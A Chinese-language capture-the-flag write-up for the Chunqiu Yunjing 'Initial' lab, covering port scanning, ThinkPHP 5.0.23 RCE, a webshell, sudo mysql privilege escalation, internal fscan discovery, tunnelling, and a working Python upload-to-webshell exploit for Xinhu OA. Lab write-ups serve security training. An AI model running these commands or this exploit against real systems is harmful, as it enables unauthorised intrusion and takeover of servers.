---
title: "春秋云境-Initial"
description: "春秋云境Initial靶场渗透测试实战记录，涵盖端口扫描、ThinkPHP漏洞利用、SUID提权等内网渗透技术的详细分析。"
date: 2025-06-16
tags:
  - "内网渗透"
  - "春秋云境"
  - "bx"
  - "suid"
  - "ThinkPHP"
authors:
  - "bx"
draft: false              # 设为 true 则为草稿
slug: "chunqiu-Initial"          # 随机URL字符串
---
<meta name="referrer" content="no-referrer">

# 春秋云境-Initial
![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753622805899-979985e8-ad9f-4fd2-9ee5-77a254fa1f6b.png)

> 题目靶场下发 IP:39.99.136.41
>

利用 Rustscan，集合 Nmap 进行扫描

```powershell
❯ .\rustscan -a 39.99.136.41 -r 1-65535 -- -sC -sV -O
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
RustScan: Making sure 'closed' isn't just a state of mind.

[~] The config file is expected to be at "C:\\Users\\lenovo\\.rustscan.toml"
Open 39.99.136.41:22
Open 39.99.136.41:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sC -sV -O" on ip 39.99.136.41
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.97 ( https://nmap.org ) at 2025-07-27 20:10 +0800
NSE: Loaded 158 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:10
Completed NSE at 20:10, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:10
Completed NSE at 20:10, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:10
Completed NSE at 20:10, 0.00s elapsed
Initiating Ping Scan at 20:10
Scanning 39.99.136.41 [4 ports]
Completed Ping Scan at 20:10, 0.07s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 20:10
Completed Parallel DNS resolution of 1 host. at 20:10, 4.57s elapsed
DNS resolution of 1 IPs took 4.62s. Mode: Async [#: 5, OK: 0, NX: 0, DR: 1, SF: 0, TR: 6, CN: 0]
Initiating SYN Stealth Scan at 20:10
Scanning 39.99.136.41 [2 ports]
Discovered open port 80/tcp on 39.99.136.41
Discovered open port 22/tcp on 39.99.136.41
Completed SYN Stealth Scan at 20:10, 0.03s elapsed (2 total ports)
Initiating Service scan at 20:10
Scanning 2 services on 39.99.136.41
Completed Service scan at 20:10, 6.08s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 39.99.136.41
NSE: Script scanning 39.99.136.41.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:10
Completed NSE at 20:10, 5.10s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:10
Completed NSE at 20:10, 0.15s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:10
Completed NSE at 20:10, 0.00s elapsed
Nmap scan report for 39.99.136.41
Host is up, received echo-reply ttl 52 (0.026s latency).
Scanned at 2025-07-27 20:10:07 中国标准时间 for 13s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 52 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 ee:cd:c6:f8:25:74:f0:db:b9:1e:bf:cb:e7:85:08:92 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEm8945hIofKPC85563srnwSUPyjL51CBcxPMaveSqY2PtR2Zq9adjCSUAloJFymxhMBfzYO5npva41yJepdOJujHe+HsEekCXf3M6QEHDfrZuPv/XzIhhGex66TcBkb5BkHwbl4WoFbA1RwrAc+iN8uwgeU+3ScTNKzht88hQNp+mlDtTircZeCjmfQ4Mo/MDG6+Bysxt3GsMrMththvdotNx4NyN9T+V4KDmIhNSVW2VP33CgTheEsxNns9YLaqj1AR2e3xyfTWta4MQpBS9CkkIGT4ws/qYE+xxQP1/nmc/+lQ5/7I0KW/Ynhey3YSoOIp4AsFEl5ZeYQrNDCYuMVN0yz02/YxdkZR2axyHL7rCctCtLgTqQOZkNll08bxzP0CVRZikcH96udGMRU9XUvb2UZfgPGiV8nIZekRY5EXYJ87c6DJbW4wyjjGZrDX581om7O5G7o2ZNWs5Sbls/VORmTv6eRG2nj8mVjMDdgFGt4LSpY6IP2A6G5jXMS0=
|   256 27:72:9a:24:0e:0b:20:58:48:e6:0d:be:0e:fa:fd:86 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMZAKQIoOyy2pGNGU1EhieK+g4legisI1FMQqzjDEQP6RTo1dkU6TGNeedgiwnBiIc9eoUPvFEnVEFx2pxem3z8=
|   256 bd:87:6e:15:1b:ca:1d:ac:4f:50:22:06:fa:b1:02:7d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJaUkm5QfFtAbjOhh0neY9WvUTnzqG6tgGg72NObx0Qc
80/tcp open  http    syn-ack ttl 52 Apache httpd 2.4.41 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Bootstrap Material Admin
|_http-favicon: Unknown favicon MD5: F49C4A4BDE1EEC6C0B80C2277C76E3DB
|_http-server-header: Apache/2.4.41 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4
OS details: Linux 4.19 - 5.15
TCP/IP fingerprint:
OS:SCAN(V=7.97%E=4%D=7/27%OT=22%CT=%CU=39143%PV=Y%DS=14%DC=I%G=N%TM=6886172
OS:C%P=i686-pc-windows-windows)SEQ(SP=106%GCD=1%ISR=108%TI=Z%II=I%TS=A)OPS(
OS:O1=M578ST11NW7%O2=M578ST11NW7%O3=M578NNT11NW7%O4=M578ST11NW7%O5=M578ST11
OS:NW7%O6=M578ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=41%W=FAF0%O=M578NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=41%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=41%W=0%S=Z%A=S+%F=AR%O=%RD=0
OS:%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R
OS:=Y%DFI=N%T=41%CD=S)

Uptime guess: 14.861 days (since Sat Jul 12 23:30:31 2025)
Network Distance: 14 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:10
Completed NSE at 20:10, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:10
Completed NSE at 20:10, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:10
Completed NSE at 20:10, 0.00s elapsed
Read data files from: D:\huanjing\nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.10 seconds
           Raw packets sent: 37 (2.558KB) | Rcvd: 15 (1.286KB)
```

发现 80 和 22 端口开放

web 服务框架为 ThinkPHP

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753618222440-b757ddf8-1b63-4e57-9286-db90cc531295.png)

利用 ThinkPHP 工具扫描发现

存在 ThinkPHP 5.0.23 RCE 漏洞

直接利用

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753618386191-5f19b5cc-d05a-4ac7-b2a3-13bbeaa80486.png)

上传木马，蚁剑连接

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753618396858-4ac01b4d-0e3c-45c0-a2b5-27375a251e7b.png)

进入虚拟终端，发现/root 目录没有权限，并且存在 flag 目录

当前我们是`www-data`，可以进行`sudo -l`发现可以利用`mysql`命令提权

[mysql | GTFOBins](https://gtfobins.github.io/gtfobins/mysql/)

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753632134314-af885357-6beb-42d0-ba26-9fcec96e246f.png)

```powershell
sudo mysql -e '\! /bin/sh'
```

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753618619103-9b7fe44a-522e-4ca4-97ec-eb9081f8991c.png)

可以获取到第一段 flag

然后就是内网的横向移动，我们先上传一个 fscan 扫描一下

> 如果使用蚁剑的虚拟终端的话，需要把 fscan 的结果保存到文件中查看
>

```powershell
www-data:/tmp) $ cat 1.txt
┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan Version: 2.0.1
[2.2s]     已选择服务扫描模式
[2.2s]     开始信息扫描
[2.2s]     CIDR范围: 172.22.1.0-172.22.1.255
[2.2s]     generate_ip_range_full
[2.2s]     解析CIDR 172.22.1.0/24 -> IP范围 172.22.1.0-172.22.1.255
[2.2s]     最终有效主机数量: 256
[2.2s]     开始主机扫描
[2.2s]     使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle
[2.2s]     正在尝试无监听ICMP探测...
[2.2s]     ICMP连接失败: dial ip4:icmp 127.0.0.1: socket: operation not permitted
[2.2s]     当前用户权限不足,无法发送ICMP包
[2.2s]     切换为PING方式探测...
[3.3s] [*] 目标 172.22.1.15     存活 (ICMP)
[3.3s] [*] 目标 172.22.1.18     存活 (ICMP)
[4.3s] [*] 目标 172.22.1.2      存活 (ICMP)
[4.3s] [*] 目标 172.22.1.21     存活 (ICMP)
[8.2s]     存活主机数量: 4
[8.2s]     有效端口数量: 233
[8.2s] [*] 端口开放 172.22.1.15:80
[8.2s] [*] 端口开放 172.22.1.15:22
[8.2s] [*] 端口开放 172.22.1.18:3306
[8.2s] [*] 端口开放 172.22.1.18:445
[8.2s] [*] 端口开放 172.22.1.18:139
[8.2s] [*] 端口开放 172.22.1.18:135
[8.2s] [*] 端口开放 172.22.1.18:80
[8.3s] [*] 端口开放 172.22.1.21:445
[8.3s] [*] 端口开放 172.22.1.21:135
[8.3s] [*] 端口开放 172.22.1.21:139
[8.3s] [*] 端口开放 172.22.1.2:445
[8.3s] [*] 端口开放 172.22.1.2:389
[8.3s] [*] 端口开放 172.22.1.2:139
[8.3s] [*] 端口开放 172.22.1.2:135
[8.3s] [*] 端口开放 172.22.1.2:88
[11.2s]     扫描完成, 发现 15 个开放端口
[11.2s]     存活端口数量: 15
[11.2s]     开始漏洞扫描
[11.4s] [*] 网站标题 http://172.22.1.18        状态码:302 长度:0      标题:无标题 重定向地址: http://172.22.1.18?m=login
[11.4s] [*] NetInfo 扫描结果
目标主机: 172.22.1.21
主机名: XIAORANG-WIN7
发现的网络接口:
   IPv4地址:
      └─ 172.22.1.21
[11.4s] [*] NetInfo 扫描结果
目标主机: 172.22.1.2
主机名: DC01
发现的网络接口:
   IPv4地址:
      └─ 172.22.1.2
[11.4s] [*] NetInfo 扫描结果
目标主机: 172.22.1.18
主机名: XIAORANG-OA01
发现的网络接口:
   IPv4地址:
      └─ 172.22.1.18
[11.4s] [*] 网站标题 http://172.22.1.15        状态码:200 长度:5578   标题:Bootstrap Material Admin
[11.5s]     系统信息 172.22.1.2 [Windows Server 2016 Datacenter 14393]
[11.5s]     POC加载完成: 总共387个，成功387个，失败0个
[11.5s] [*] 网站标题 http://172.22.1.18?m=login 状态码:200 长度:4012   标题:信呼协同办公系统
[11.5s] [+] NetBios 172.22.1.2      DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393
[11.5s] [+] 发现漏洞 172.22.1.21 [Windows Server 2008 R2 Enterprise 7601 Service Pack 1] MS17-010
[11.5s] [+] NetBios 172.22.1.18     XIAORANG-OA01.xiaorang.lab          Windows Server 2012 R2 Datacenter 9600
[11.5s] [+] NetBios 172.22.1.21     XIAORANG-WIN7.xiaorang.lab          Windows Server 2008 R2 Enterprise 7601 Service Pack 1
[14.5s] [+] 目标: http://172.22.1.15:80
  漏洞类型: poc-yaml-thinkphp5023-method-rce
  漏洞名称: poc1
  详细信息:
    参考链接:https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce
```

172.22.1.2 (DC01)域控制器

+ **系统**: Windows Server 2016 Datacenter 14393
+ **主机名**: DC01.xiaorang.lab
+ **开放端口**:
- 88 (Kerberos)
- 135 (RPC)
- 139 (NetBIOS)
- 389 (LDAP)
- 445 (SMB)

172.22.1.18 (XIAORANG-OA01)

+ **角色**: OA办公系统服务器
+ **系统**: Windows Server 2012 R2 Datacenter 9600
+ **主机名**: XIAORANG-OA01.xiaorang.lab
+ **开放端口**:
- 80 (HTTP)
- 135 (RPC)
- 139 (NetBIOS)
- 445 (SMB)
- 3306 (MySQL)
+ **Web服务**: 信呼协同办公系统

172.22.1.21 (XIAORANG-WIN7)

+ **系统**: Windows Server 2008 R2 Enterprise 7601 SP1
+ **主机名**: XIAORANG-WIN7.xiaorang.lab
+ **开放端口**:
- 135 (RPC)
- 139 (NetBIOS)
- 445 (SMB)



同时发现永恒之蓝漏洞**MS17-010 (永恒之蓝)** - 172.22.1.21



这里使用

[Neo-reGeorg](https://github.com/L-codes/Neo-reGeorg)

搭建代理隧道

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753788326252-2b1f75ea-f8bc-4e3d-a563-16c31e17e5de.png)

利用 Prof 创建本地代理

然后访问 OA 系统

弱口令

```bash
admin/admin123
```

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753621487248-7a6fb06e-4c4f-4245-90e8-09580340f274.png)

寻找漏洞

利用

```powershell
import requests
session = requests.session()
url_pre = 'http://172.22.1.18/'
url1 = url_pre + '?a=check&m=login&d=&ajaxbool=true&rnd=533953'
url2 = url_pre + '/index.php?a=upfile&m=upload&d=public&maxsize=100&ajaxbool=true&rnd=798913'
url3 = url_pre + '/task.php?m=qcloudCos|runt&a=run&fileid=11'
data1 = {
    'rempass': '0',
    'jmpass': 'false',
    'device': '1625884034525',
    'ltype': '0',
    'adminuser': 'YWRtaW4=::',
    'adminpass': 'YWRtaW4xMjM=',
    'yanzm': ''
}
r = session.post(url1, data=data1)
r = session.post(url2, files={'file': open('1.php', 'r+')})
filepath = str(r.json()['filepath'])
filepath = "/" + filepath.split('.uptemp')[0] + '.php'
id = r.json()['id']
url3 = url_pre + f'/task.php?m=qcloudCos|runt&a=run&fileid={id}'
r = session.get(url3)
r = session.get(url_pre + filepath)
print(r.text)
print(url_pre + filepath)
```

连接 webshell，找到第二段 flag

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753622213198-1b136883-89b8-473a-ba4a-80015d7404e7.png)

